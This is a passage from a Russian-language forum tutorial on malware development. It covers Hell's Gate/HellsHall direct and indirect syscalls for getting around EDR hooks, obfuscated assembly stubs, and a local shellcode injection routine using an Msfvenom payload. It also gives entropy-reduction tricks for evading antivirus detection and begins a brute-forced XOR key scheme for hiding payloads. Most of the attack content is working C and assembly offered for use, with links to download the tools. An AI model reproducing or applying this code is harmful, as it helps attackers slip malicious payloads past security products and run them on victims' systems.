                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // Выход из цикла for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // Выход из цикла for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

                for (WORD idx = 1; idx &lt;= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // Выход из цикла for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // Выход из цикла for-loop [idx]
                    }
                }
            }

            break; // Выход из цикла for-loop [i]

        }

    }

    if (pNtSys-&gt;dwSSn != NULL &amp;&amp; pNtSys-&gt;pSyscallAddress != NULL &amp;&amp; pNtSys-&gt;dwSyscallHash != NULL)
        return TRUE;
    else
        return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Обновление сборочных функций</b><br />
<br />
Функции HellsGate и HellDescent, найденные в файле hellsgate.asm, будут заменены на SetSSn и RunSyscall соответственно. SetSSn требует SSN вызываемого системного вызова, а RunSyscall выполняет его.<br />
<br />
В этих двух функциях не производятся крупные обновления, однако были добавлены дополнительные инструкции ассемблера, которые не влияют на выполнение программы, но добавляют обфускацию.<br />
<br />
Обновление сборочных функций Функции HellsGate и HellDescent, найденные в файле hellsgate.asm, будут заменены на SetSSn и RunSyscall соответственно. SetSSn требует SSN вызываемого системного вызова, а RunSyscall выполняет его.<br />
<br />
В этих двух функциях не производятся крупные обновления, однако были добавлены дополнительные инструкции ассемблера, которые не влияют на выполнение программы, но добавляют обфускацию.<br />
<br />
<b>Незатронутые сборочные функции</b><br />
<br />
SetSSN и RunSyscall без лишних сборочных инструкций:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>.data
    wSystemCall DWORD 0000h

.code

    SetSSn PROC
        mov wSystemCall, ecx
        ret
    SetSSn ENDP

    RunSyscall PROC
        mov r10, rcx
        mov eax, wSystemCall
        syscall
        ret
    RunSyscall ENDP

end</code></pre>
	</div>
</div><br />
<b>Сборочные функции с обфускацией</b><br />
<br />
SetSSN и RunSyscall с добавленными сборочными инструкциями:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>.data
    wSystemCall DWORD 0000h

.code

    SetSSn PROC
        xor eax, eax          ; eax = 0
        mov wSystemCall, eax  ; wSystemCall = 0
        mov eax, ecx          ; eax = ssn
        mov r8d, eax          ; r8d = eax = ssn
        mov wSystemCall, r8d  ; wSystemCall = r8d = eax = ssn
        ret
    SetSSn ENDP

    RunSyscall PROC
        xor r10, r10          ; r10 = 0
        mov rax, rcx          ; rax = rcx
        mov r10, rax          ; r10 = rax = rcx
        mov eax, wSystemCall  ; eax = ssn
        jmp Run                ; выполнить &#039;Run&#039;
        xor eax, eax           ; не выполнится
        xor rcx, rcx           ; не выполнится
        shl r10, 2             ; не выполнится
    Run:
        syscall
        ret
    RunSyscall ENDP

end</code></pre>
	</div>
</div><br />
<b>Обновление главной функции<br />
<br />
Создание структуры NTAPI_FUNC</b><br />
<br />
Обновленная реализация Hell&#039;s Gate завершена.<br />
Последний шаг - это тестирование реализации, которое требует главной функции. Для этого создается новая структура, которая заменяет VX_TABLE. Новая структура NTAPI_FUNC будет содержать информацию о системных вызовах. Хранение этой информации в структуре позволит вызывать системные вызовы несколько раз, когда они инициализируются как глобальная переменная.<br />
<br />
Структура NTAPI_FUNC представлена ниже:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _NTAPI_FUNC
{
    NT_SYSCALL    NtAllocateVirtualMemory;
    NT_SYSCALL    NtProtectVirtualMemory;
    NT_SYSCALL    NtCreateThreadEx;
    NT_SYSCALL    NtWaitForSingleObject;

} NTAPI_FUNC, *PNTAPI_FUNC;

// глобальная переменная
NTAPI_FUNC g_Nt = { 0 };</code></pre>
	</div>
</div><br />
<b>Создание функции InitializeNtSyscalls</b><br />
<br />
Для заполнения глобальной переменной g_Nt создается новая функция InitializeNtSyscalls, которая будет вызывать FetchNtSyscall для инициализации всех членов NTAPI_FUNC.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InitializeNtSyscalls() {

    if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &amp;g_Nt.NtAllocateVirtualMemory)) {
        printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n&quot;);
        return FALSE;
    }
    printf(&quot;[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n&quot;, g_Nt.NtAllocateVirtualMemory.dwSSn);


    if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &amp;g_Nt.NtProtectVirtualMemory)) {
        printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n&quot;);
        return FALSE;
    }
    printf(&quot;[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n&quot;, g_Nt.NtProtectVirtualMemory.dwSSn);


    if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &amp;g_Nt.NtCreateThreadEx)) {
        printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n&quot;);
        return FALSE;
    }
    printf(&quot;[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n&quot;, g_Nt.NtCreateThreadEx.dwSSn);


    if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &amp;g_Nt.NtWaitForSingleObject)) {
        printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n&quot;);
        return FALSE;
    }
    printf(&quot;[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n&quot;, g_Nt.NtWaitForSingleObject.dwSSn);

    return TRUE;
}</code></pre>
	</div>
</div><br />
NtAllocateVirtualMemory_CRC32, NtProtectVirtualMemory_CRC32, NtCreateThreadEx_CRC32 и NtWaitForSingleObject_CRC32 - это хэш-значения соответствующих системных вызовов.<br />
<br />
<b>Программа Hasher</b><br />
<br />
Хэши системных вызовов генерируются с использованием программы Hasher, которая содержит функцию хеширования crc32h. Hasher печатает значения вывода функции crc32h.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

#define SEED 0xEDB88320
#define STR &quot;_CRC32&quot;

unsigned int crc32h(char* message) {
    int i, crc;
    unsigned int byte, c;
    const unsigned int g0 = SEED, g1 = g0 &gt;&gt; 1,
        g2 = g0 &gt;&gt; 2, g3 = g0 &gt;&gt; 3, g4 = g0 &gt;&gt; 4, g5 = g0 &gt;&gt; 5,
        g6 = (g0 &gt;&gt; 6) ^ g0, g7 = ((g0 &gt;&gt; 6) ^ g0) &gt;&gt; 1;

    i = 0;
    crc = 0xFFFFFFFF;
    while ((byte = message[i]) != 0) {    // Get next byte.
        crc = crc ^ byte;
        c = ((crc &lt;&lt; 31 &gt;&gt; 31) &amp; g7) ^ ((crc &lt;&lt; 30 &gt;&gt; 31) &amp; g6) ^
            ((crc &lt;&lt; 29 &gt;&gt; 31) &amp; g5) ^ ((crc &lt;&lt; 28 &gt;&gt; 31) &amp; g4) ^
            ((crc &lt;&lt; 27 &gt;&gt; 31) &amp; g3) ^ ((crc &lt;&lt; 26 &gt;&gt; 31) &amp; g2) ^
            ((crc &lt;&lt; 25 &gt;&gt; 31) &amp; g1) ^ ((crc &lt;&lt; 24 &gt;&gt; 31) &amp; g0);
        crc = ((unsigned)crc &gt;&gt; 8) ^ c;
        i = i + 1;
    }
    return ~crc;
}

#define HASH(API) crc32h((char*)API)

int main() {
    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtAllocateVirtualMemory&quot;, STR, HASH(&quot;NtAllocateVirtualMemory&quot;));
    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtProtectVirtualMemory&quot;, STR, HASH(&quot;NtProtectVirtualMemory&quot;));
    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtCreateThreadEx&quot;, STR, HASH(&quot;NtCreateThreadEx&quot;));
    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtWaitForSingleObject&quot;, STR, HASH(&quot;NtWaitForSingleObject&quot;));
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746787788606.png"
		data-src="https://osint42.org/attachments/1746787788606-png.258/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787788606-png.258/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787788606.png"
			title="1746787788606.png"
			width="1256" height="99" loading="lazy" />
	</div><br />
<br />
<b>Главная функция</b><br />
<br />
Сначала вызывается функция InitializeNtSyscalls, а затем вызываются системные вызовы для выполнения локальной инъекции кода с использованием shellcode из Msfvenom. Вызов системных вызовов выполняется с использованием сборочных функций SetSSn и RunSyscall, описанных ранее.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    NTSTATUS    STATUS      = NULL;
    PVOID       pAddress    = NULL;
    SIZE_T      sSize       = sizeof(Payload);
    DWORD       dwOld       = NULL;
    HANDLE      hProcess    = (HANDLE)-1,   // локальный процесс
                hThread     = NULL;

    // Инициализация используемых системных вызовов
    if (!InitializeNtSyscalls()) {
        printf(&quot;[!] Failed To Initialize The Specified Direct-Syscalls \n&quot;);
        return -1;
    }

    // Выделение памяти
    SetSSn(g_Nt.NtAllocateVirtualMemory.dwSSn);
    if ((STATUS = RunSyscall(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n&quot;, STATUS);
        return -1;
    }

    // Копирование полезной нагрузки
    memcpy(pAddress, Payload, sizeof(Payload));
    sSize = sizeof(Payload);

    // Изменение защиты памяти
    SetSSn(g_Nt.NtProtectVirtualMemory.dwSSn);
    if ((STATUS = RunSyscall(hProcess, &amp;pAddress, &amp;sSize, PAGE_EXECUTE_READ, &amp;dwOld)) != 0x00) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X \n&quot;, STATUS);
        return -1;
    }

    // Выполнение полезной нагрузки
    SetSSn(g_Nt.NtCreateThreadEx.dwSSn);
    if ((STATUS = RunSyscall(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n&quot;, STATUS);
        return -1;
    }

    // Ожидание выполнения полезной нагрузки
    SetSSn(g_Nt.NtWaitForSingleObject.dwSSn);
    if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
        printf(&quot;[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n&quot;, STATUS);
        return -1;
    }

    printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
    getchar();

    return 0;
}</code></pre>
	</div>
</div><br />
Ещё более улучшенную  версию можно скачать здесь:<a href="https://github.com/Maldev-Academy/HellHall" target="_blank" class="link link--external" rel="noopener">GitHub - Maldev-Academy/HellHall: Performing Indirect Clean Syscalls</a><br />
<br />
Или с нашего ресурса:https://osint42.org/attachments/hellshall-clang-nocrt-zip.260/<br />
<br />
В этой версии убрана инструкция syscall, по наличию которой в коде может-быть детект.)<br />
<br />
<b>Как это работает</b><br />
<br />
HellsHall будет искать инструкцию системного вызова около адреса функции системного вызова, а затем сохранит этот адрес инструкции системного вызова в глобальную переменную, к которой будет выполнен переход позднее,<b> а не выполнение этой инструкции напрямую из asm-файла. </b><br />
<br />
Это приведет к тому, что функция системного вызова будет выполнена из адресного пространства ntdll.dll.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787823532.png"
		data-src="https://osint42.org/attachments/1746787823532-png.259/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787823532-png.259/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787823532.png"
			title="1746787823532.png"
			width="1283" height="513" loading="lazy" />
	</div><br />
<br />
Пример использования, в главной функции (<a href="https://github.com/Maldev-Academy/HellHall/blob/main/Hell%27sHall/Hell%27sHall/main.c" target="_blank" class="link link--external" rel="noopener">HellHall/Hell&#039;sHall/Hell&#039;sHall/main.c at main · Maldev-Academy/HellHall</a>):<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    printf(&quot;[i] [HELL HALL] Press &lt;Enter&gt; To Run ... &quot;);
    getchar();
 

    if (!Initialize())
        return -1;

    PVOID        pAddress    = NULL;
    SIZE_T        dwSize        = sizeof(rawData);
    DWORD        dwOld        = NULL;
    HANDLE        hThread        = NULL;
    NTSTATUS    STATUS        = NULL;


    SYSCALL(S.NtAllocateVirtualMemory);
    if ((STATUS = HellHall((HANDLE)-1, &amp;pAddress, 0, &amp;dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Status : 0x%0.8X\n&quot;, STATUS);
        return -1;
    }
 
    printf(&quot;[+] [HELL HALL] pAddress : 0x%p \n&quot;, pAddress);


    memcpy(pAddress, rawData, sizeof(rawData));


    SYSCALL(S.NtProtectVirtualMemory);
    if ((STATUS = HellHall((HANDLE)-1, &amp;pAddress, &amp;dwSize, PAGE_EXECUTE_READ, &amp;dwOld)) != 0x0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n&quot;, STATUS);
        return -1;
    }

    SYSCALL(S.NtCreateThreadEx);
    if ((STATUS = HellHall(&amp;hThread, 0x1FFFFF, NULL, (HANDLE)-1, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n&quot;, STATUS);
        return -1;
    }


    printf(&quot;[#] [HELL HALL] Press &lt;Enter&gt; To QUIT ... \n&quot;);
    getchar();
    return 0;
}</code></pre>
	</div>
</div><br />
<b>В целом алгоритм использования почти такой-же как описанный выше, но следующие отличия:<br />
<br />
1)Алгоритм хеширования crc32b.<br />
<b>3)Вместо функции SetSSn макрос SYSCALL (Вызов немного другой, но по коду главной функции думаю понятно как )</b><br />
2)Вместо функции RunSyscall функция HellHall</b></div>
						

							<h2>Уменьшение вероятности детекта зверька</h2>

							

							

							<div class="bbWrapper"><b>Введение</b><br />
<br />
Энтропия относится к степени случайности в предоставленном наборе данных. Существует различные типы мер энтропии, такие как энтропия Гиббса, энтропия Больцмана и энтропия Реньи. Однако в контексте кибербезопасности термин &quot;энтропия&quot; обычно относится к Энтропии Шеннона, которая выдает значение от 0 до 8. С увеличением уровня случайности в наборе данных увеличивается и значение энтропии.<br />
<br />
Бинарные файлы вредоносных программ обычно имеют более высокое значение энтропии по сравнению с обычными файлами. <b>Высокая энтропия, как правило, является индикатором сжатых, зашифрованных или упакованных данных</b>, которые часто используются вредоносными программами для скрытия нагрузки. Сжатые, зашифрованные или упакованные данные часто генерируют большое количество случайного вывода, что объясняет, почему энтропия выше в файлах с вредоносными программами.<br />
<br />
На рисунке ниже сравнивается энтропия легитимного программного обеспечения и образцов вредоносных программ. Обратите внимание, как у большинства файлов с вредоносными программами значение энтропии находится в диапазоне от 7,2 до 8, в то время как безвредные файлы в основном находятся в диапазоне от 5,6 до 6,8. Изображение взято из статьи <a href="https://practicalsecurityanalytics.com/file-entropy/" target="_blank" class="link link--external" rel="noopener">Threat Hunting with File Entropy</a>, которая показывает, как использовать энтропию файла для поиска угроз.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788421956.png"
		data-src="https://osint42.org/attachments/1746788421956-png.272/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788421956-png.272/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788421956.png"
			title="1746788421956.png"
			width="856" height="709" loading="lazy" />
	</div><br />
<br />
С этим сказанным, целью данного раздела является уменьшение энтропии вредоносного файла и размещение его в приемлемом диапазоне, подобном безвредному файлу.<br />
<br />
<b>Измерение энтропии файла</b><br />
<br />
Для понимания того, как уменьшить энтропию файла, важно сначала понять, как ее вычислить. Существует несколько инструментов, которые могут определить энтропию данного файла, таких как <a href="https://www.winitor.com/download" target="_blank" class="link link--external" rel="noopener">pestudio </a>и <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sigcheck" target="_blank" class="link link--external" rel="noopener">Sigcheck</a>.<br />
<br />
Однако ради простоты, в коде, предоставленном в этом разделе, есть файл на Python, EntropyCalc.py, который вычисляет энтропию файла. Кроме того, с помощью этого скрипта на Python можно вычислить энтропию разделов PE-файла с помощью флага -pe.<br />
<br />
Следующее изображение показывает файл EntropyCalc.py в действии.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788431755.png"
		data-src="https://osint42.org/attachments/1746788431755-png.273/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788431755-png.273/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788431755.png"
			title="1746788431755.png"
			width="1039" height="502" loading="lazy" />
	</div><br />
<br />
<b>EntropyCalc.py</b><br />
<br />
EntropyCalc.py использует функцию calc_entropy для вычисления энтропии указанных данных в буфере. Эта функция использует формулу энтропии Шеннона для вычисления значения энтропии.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>def calc_entropy(buffer):
    if isinstance(buffer, str):
        buffer = buffer.encode()
    entropy = 0
    for x in range(256):
        p = (float(buffer.count(bytes([x])))) / len(buffer)
        if p &gt; 0:
            entropy += - p * math.log(p, 2)
    return entropy</code></pre>
	</div>
</div><br />
<b>Уменьшение энтропии</b><br />
<br />
Как уже упоминалось ранее, файл с вредоносными программами обычно содержит данные, которые часто обфусцированы или закодированы способом, который увеличивает их энтропию. Для решения этой проблемы одним из решений является изменение используемого алгоритма шифрования, так как некоторые алгоритмы шифрования генерируют более высокую энтропию для своих данных в виде шифротекста, чем другие.<br />
<br />
Например, <b>использование шифрования XOR с одним байтом не изменяет общей энтропии выходных данных. </b>Недостатком этого алгоритма является то, что он считается слабым алгоритмом шифрования.<br />
<br />
Другим эффективным методом для поддержания низкой энтропии является использование алгоритмов обфускации, объясненных в начальных статьях, таких как IPv4fuscation, IPv6fuscation, Macfuscation и UUIDfuscation, вместо использования алгоритмов шифрования. Эти методы обфускации выводят данные, которые имеют степень организации и порядка. Поэтому похожие байтовые узоры в наборе данных будут иметь более низкие значения энтропии по сравнению с набором данных с полностью случайными байтами.<br />
<br />
<b>Вставка английских строк </b><br />
<br />
Другим методом для уменьшения энтропии является вставка английских строк в код окончательной реализации. Эта техника была замечена в различных образцах вредоносных программ, где в код вставляется случайный набор английских строк. Это работает потому, что английский алфавит состоит всего из 26 символов, что означает, что есть всего 26 * 2 (верхний и нижний регистр букв) разных возможностей для каждого байта. Это меньше, чем количество возможностей, которые выдают алгоритмы шифрования (255 возможностей). Если вы хотите использовать эту технику, рекомендуется использовать либо только строчные, либо только прописные буквы, чтобы уменьшить количество возможностей для каждого байта.<br />
<br />
Сказав это, следует отметить, что такой подход не рекомендуется, потому что<b> строки, вставленные в реализацию, могут быть использованы впоследствии в качестве сигнатур для обнаружения вредоносного программного обеспечения.<br />
<br />
Дополнение одинаковыми байтами</b><br />
<br />
Более простым способом уменьшения энтропии является дополнение шифротекста полезной нагрузки одинаковым байтом. Это работает потому, что добавленные байты будут иметь энтропию 0,00, так как они все одинаковы.<br />
<br />
Например, на следующем изображении показано, как энтропия шелл-кода Msfvenom резко снижается с 5,88325 до 3,77597 после добавления к нему 285 байтов 0xEA.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788445179.png"
		data-src="https://osint42.org/attachments/1746788445179-png.274/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788445179-png.274/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788445179.png"
			title="1746788445179.png"
			width="1429" height="718" loading="lazy" />
	</div><br />
<br />
Недостатком этого подхода является увеличение размера полезной нагрузки. Более крупные нагрузки потребуют больше байтов, что также увеличит размер.<br />
<br />
Независимость от библиотеки CRT Библиотека CRT, или C Runtime library, представляет собой стандартный интерфейс для языка программирования C, который содержит набор функций и макросов. Эти функции обычно связаны с управлением памятью (например, memcpy), открытием и закрытием файлов (например, fopen) и манипулированием строками (например, strcpy).<br />
<br />
<b>Удаление библиотеки CRT</b><br />
<br />
Может значительно уменьшить энтропию окончательной реализации. На следующем изображении сравниваются два файла, Hello World.exe и Hello World - No CRT.exe, которые имеют одинаковый код, но скомпилированы с и без библиотеки CRT. Hello World - No CRT.exe имеет значительно более низкое значение энтропии по сравнению с Hello World.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788453487.png"
		data-src="https://osint42.org/attachments/1746788453487-png.275/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788453487-png.275/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788453487.png"
			title="1746788453487.png"
			width="1112" height="643" loading="lazy" />
	</div><br />
<br />
<b>Инструмент Maldev Academy - EntropyReducer</b><br />
<br />
Также можно уменьшить энтропию полезной нагрузки с помощью инструмента <a href="https://github.com/Maldev-Academy/EntropyReducer" target="_blank" class="link link--external" rel="noopener">EntropyReducer</a>, разработанного командой MalDev Academy.<br />
EntropyReducer использует собственный алгоритм, который использует связанные списки для вставки нулевых байтов между каждым блоком полезной нагрузки размером BUFF_SIZE.<br />
<br />
Объяснение связанных списков выходит за рамки данной статьи, однако хорошо документированный readme и хорошо прокомментированный код в репозитории должны быть достаточными для понимания алгоритма инструмента.<br />
<br />
<b>Брут ключа дешифровки полезной нагрузки<br />
<br />
Введение</b><br />
<br />
В начальных статьях демонстрировались процессы шифрования и дешифрования данных, а также предупреждалось о том, что сохранение ключа шифрования в виде открытого текста в бинарном файле делает его легкодоступным. Один из способов решить эту проблему - шифровать ключ другим ключом и расшифровывать его во время выполнения программы. Чтобы избежать жесткой привязки ключа к бинарному файлу, ключ получается методом &quot;грубой силы&quot;.<br />
<br />
В этом модуле будет продемонстрирован алгоритм дешифрования XOR, при котором программа должна угадать ключ методом &quot;грубой силы&quot;.<br />
<br />
<b>Процесс шифрования ключа</b><br />
<br />
Для выполнения &quot;грубой силы&quot; при дешифровании ключа необходим байт-подсказка в функциях шифрования и дешифрования. Знание значения одного байта до и после процесса шифрования позволяет осуществить процесс дешифрования. В данном случае первый байт выбран в качестве байта-подсказки.<br />
<br />
Например, если байт-подсказка - BA, а после шифрования он становится равным 71, то процесс дешифрования будет перебирать значения до тех пор, пока не будет получено значение BA, что указывает на правильный ключ.<br />
<br />
<b>Функция шифрования ключа</b><br />
<br />
Функция GenerateProtectedKey принимает байт-подсказку и добавляет его в начало ключа в виде первого байта. Затем она использует алгоритм XOR для шифрования ключа с использованием случайно сгенерированного ключа во время выполнения.<br />
<br />
Обратите внимание, что функция PrintHex предназначена для вывода входного буфера в виде шестнадцатеричного массива и используется для вывода сгенерированного ключа в виде открытого текста.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>/*

HintByte: байт-подсказка, который будет сохранен в качестве первого байта ключа
sKey: размер ключа для генерации
ppProtectedKey: указатель на буфер PBYTE, который получит зашифрованный ключ
*/
VOID GenerateProtectedKey(IN BYTE HintByte, IN SIZE_T sKey, OUT PBYTE* ppProtectedKey) {

// Генерация начального значения
srand(time(NULL));

// &#039;b&#039; используется как ключ алгоритма шифрования ключа
BYTE        b                = rand() % 0xFF;

// &#039;pKey&#039; - это буфер для генерации исходного ключа
PBYTE       pKey             = (PBYTE)malloc(sKey);

// &#039;pProtectedKey&#039; - это зашифрованная версия &#039;pKey&#039;, использующая &#039;b&#039;
PBYTE       pProtectedKey    = (PBYTE)malloc(sKey);

if (!pKey || !pProtectedKey)
    return;

// Генерация еще одного начального значения
srand(time(NULL) * 2);

// Ключ начинается с байта-подсказки
pKey[0] = HintByte;
// Генерация остальной части ключа
for (int i = 1; i &lt; sKey; i++){
    pKey[i] = (BYTE)rand() % 0xFF;
}

printf(&quot;[+] Сгенерированный байт ключа: 0x%0.2X \n\n&quot;, b);
printf(&quot;[+] Исходный ключ: &quot;);
PrintHex(pKey, sKey);

// Шифрование ключа с использованием алгоритма XOR
